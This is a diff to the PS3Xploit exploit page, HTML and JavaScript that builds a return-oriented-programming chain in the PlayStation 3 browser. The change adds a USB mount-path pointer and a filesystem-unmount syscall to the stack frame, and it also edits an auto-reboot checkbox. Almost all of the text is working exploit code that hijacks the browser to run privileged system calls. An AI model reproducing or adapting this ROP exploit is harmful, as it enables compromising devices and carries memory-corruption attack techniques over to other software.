@@ -17,6 +17,7 @@ function initROP(init)
 		//############################ Set xtra_data pointers and values #############################################
 		xtra_data=start_x.convert()
 		+mount_path_hdd1.convert()
+		+mount_path_usb0.convert()
 		+hdd1_partition.convert()
 		+filesystem_ufs.convert()
 		+unescape("\uFD7E");
@@ -28,13 +29,16 @@ function initROP(init)
 			search_max_threshold-=search_size;
 		}
 		mount_path_hdd1_addr=xtra_data_addr+0x2;
-		hdd1_partition_addr=mount_path_hdd1_addr+mount_path_hdd1.convertedSize()+0x4;
+		mount_path_usb0_addr=mount_path_hdd1_addr+mount_path_hdd1.convertedSize();
+		hdd1_partition_addr=mount_path_usb0_addr+mount_path_usb0.convertedSize()+0x4;
 		filesystem_ufs_addr=hdd1_partition_addr+hdd1_partition.convertedSize()-0x4;
 		//############################ End xtra_data #################################################################
 		
 		
 		//############################ Building stack frame ############################################################
 		stack_frame=stack_frame_hookup()
+		+syscall(sc_fs_unmount,mount_path_hdd1_addr,0,0,0,0,0,0,0)
+		//+syscall(sc_fs_unmount,mount_path_usb0_addr,0,0,0,0,0,0,0)
 		+syscall(sc_fs_umount,hdd1_partition_addr,filesystem_ufs_addr,mount_path_hdd1_addr,0,0,0,0,0)
 		+stack_frame_exit();
 		//############################ End stack frame ###############################################################
@@ -113,7 +117,7 @@ function triggerX()
 	<div id="headerId">
 	<h1>PS3Xploit Running....</h1>
 	<span id="hideme" style="visibility:hidden"><input type="checkbox" id="auto_close" name="aclose" checked="checked" onclick="autoclose();"/></span>
-	<!-- <input type="checkbox" id="auto_reboot" name="areboot" checked="checked" onclick="autoreboot();" style=":display: none;"/> -->
+	<!-- <input type="checkbox" id="auto_reboot" name="areboot" checked="checked" onclick="autoreboot();"/> -->
 	<div id="result"></div>
 	<div id="log"></div>
 	<div id="exploit" ></div>
